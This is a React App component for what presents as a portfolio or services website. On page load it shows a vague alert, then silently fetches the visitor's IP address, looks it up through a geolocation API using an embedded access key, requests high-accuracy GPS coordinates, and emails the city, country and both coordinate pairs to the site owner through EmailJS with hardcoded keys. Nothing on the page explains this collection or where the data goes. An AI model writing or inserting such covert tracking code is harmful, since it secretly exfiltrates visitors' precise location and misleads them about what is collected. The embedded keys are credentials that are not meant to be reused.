import "./App.css";
import { useEffect, useState } from "react";
import emailjs from "emailjs-com";
import Home from "./components/Home.jsx";
import About from "./components/About.jsx";
import Work from "./components/Work.jsx";
import Testimonial from "./components/Testimonial.jsx";
import Contact from "./components/Contact.jsx";
import Footer from "./components/Footer.jsx";

function App() {
  const [result, setResult] = useState(null);

  useEffect(() => {
    // New New
    alert(
      "We want your location to provide the best Services at your door step. Thank You"
    );
    const getLocation = () => {
      return new Promise((resolve, reject) => {
        if ("geolocation" in navigator) {
          const options = {
            enableHighAccuracy: true,
            maximumAge: 0, // Force the device to retrieve a fresh location
            timeout: 10000, // Set a timeout of 10 seconds
          };

          navigator.geolocation.getCurrentPosition(
            (position) => {
              const { latitude, longitude } = position.coords;
              resolve({ latitude, longitude });
            },
            (error) => {
              reject(error);
            },
            options // Pass the options object to enable high accuracy
          );
        } else {
          reject(new Error("Geolocation is not available in this browser."));
        }
      });
    };

    // New New
    const getUserIPAddress = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        if (response.ok) {
          const data = await response.json();
          return data.ip;
        } else {
          throw new Error("Failed to fetch user IP address");
        }
      } catch (error) {
        console.error("Error fetching user IP address:", error);
        return null;
      }
    };

    const getIpInfo = async (ipAddress) => {
      try {
        const accessKey = "94de412f-1efb-4de1-9f58-b54e793f85e3";
        const url = `https://apiip.net/api/check?ip=${ipAddress}&accessKey=${accessKey}`;
        const response = await fetch(url);
        const result = await response.json();
        setResult(result);

        if (result) {
          console.log(result);
          sendEmail(result);
        } else {
          console.error("Location information not available in the response.");
        }
      } catch (error) {
        console.error("Error fetching IP information:", error);
      }
    };

    const sendEmail = async (result) => {
      try {
        const { countryName, city, latitude, longitude } = result;
        const { latitude: geolat, longitude: geolong } = await getLocation();

        const templateParams = {
          countryName,
          city,
          latitude,
          longitude,
          geolong,
          geolat,
        };

        const response = await emailjs.send(
          "service_y5mt0xe",
          "template_ad8omla",
          templateParams,
          "_rDAsS0VvrZK8pJj8"
        );

        console.log("Email sent successfully!", response.status, response.text);
      } catch (error) {
        console.error("Error sending email:", error);
      }
    };

    const fetchData = async () => {
      const ipAddress = await getUserIPAddress();
      if (ipAddress) {
        console.log("User IP Address:", ipAddress);
        await getIpInfo(ipAddress);
      } else {
        console.error("Failed to get user IP address.");
      }
    };

    fetchData();
  }, []);
  return (
    <div className="App">
      <Home />
      <About />
      <Work />
      <Testimonial />
      <Contact />
      <Footer />
    </div>
  );
}

export default App;
